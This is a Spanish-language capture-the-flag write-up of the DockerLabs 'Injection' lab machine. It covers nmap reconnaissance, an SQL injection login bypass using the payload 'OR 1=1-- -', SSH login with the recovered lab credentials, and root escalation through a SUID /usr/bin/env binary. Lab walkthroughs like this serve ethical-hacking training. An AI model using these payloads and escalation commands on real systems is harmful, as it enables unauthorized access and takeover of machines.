---
title: Injection
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2024-11-29
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-injection/injection_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - sqli
  - suid
  - ssh
  - http
  - tcp
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/injection:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.051 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/injection:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/injection:-$ sudo nmap -sCV -p22,80 -oN nmap2 127.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## Web Analysis

Lo único que encuentro en el servicio HTTP abierto es un panel de inicio de sesión.

![](/assets/img/dockerlabs-writeup-injection/injection1_1.png)

![](/assets/img/dockerlabs-writeup-injection/injection1_2.png)

![](/assets/img/dockerlabs-writeup-injection/injection1_3.png)

---
## Vulnerability Exploitation

El título de la máquina da una pista bastante evidente.

Parece que el panel es vulnerable a SQL Injection.

![](/assets/img/dockerlabs-writeup-injection/injection1_4.png)

![](/assets/img/dockerlabs-writeup-injection/injection1_5.png)

Realizando pruebas y mirando los errores en las respuestas del panel, identifico los caracteres especiales necesarios para bypassar el panel de login.

![](/assets/img/dockerlabs-writeup-injection/injection1_7.png)

![](/assets/img/dockerlabs-writeup-injection/injection1_8.png)

Como se puede ver, aplicando los caracteres ```'-- -``` el error 'Syntax error or access violation' ya no aparece.

![](/assets/img/dockerlabs-writeup-injection/injection1_9.png)

![](/assets/img/dockerlabs-writeup-injection/injection1_3.png)

Si completo la query de esta forma:
```sql
'OR 1=1-- -
```
Soy capaz de bypassear la página de inicio de sesión, ya que al agregar ```OR 1=1``` fuerzo la condición de la consulta a ser siempre verdadera (1 siempre es igual a 1), permitiendo el acceso sin necesidad de credenciales válidas.

![](/assets/img/dockerlabs-writeup-injection/injection1_11.png)

![](/assets/img/dockerlabs-writeup-injection/injection1_12.png)

Ahora tengo credenciales para conectarme por SSH, 'dylan:KJSDFG789FGSDF78'.

```terminal
/home/kali/Documents/dockerlabs/injection:-$ ssh dylan@127.17.0.2
dylan@127.17.0.2's password: KJSDFG789FGSDF78

dylan@kali:~$ whoami
dylan
```

---
## Privilege Escalation

```terminal
dylan@kali:~$ id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
```
```terminal
dylan@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
```

Para identificar posibles binarios SUID en el sistema, utilicé el siguiente comando:

```terminal
dylan@kali:~$ find / -perm -4000 2>/dev/null
```

![](/assets/img/dockerlabs-writeup-injection/injection2_1.png)


En la lista de resultados, descubrí que el binario /usr/bin/env estaba presente. Al consultarlo en GTFOBins, confirmé que este binario puede ser explotado para obtener una shell con privilegios elevados.

<https://gtfobins.github.io/gtfobins/env/>

Al ejecutar '/bin/sh' con la opción '-p', es posible iniciar una shell con privilegios elevados, ya que la opción '-p' conserva los permisos del binario SUID.

Esta técnica me permitió acceder a una shell con privilegios de root.

```terminal
dylan@kali:~$ /usr/bin/env /bin/sh -p
# id
uid=1000(dylan) gid=1000(dylan) euid=0(root) groups=1000(dylan)
```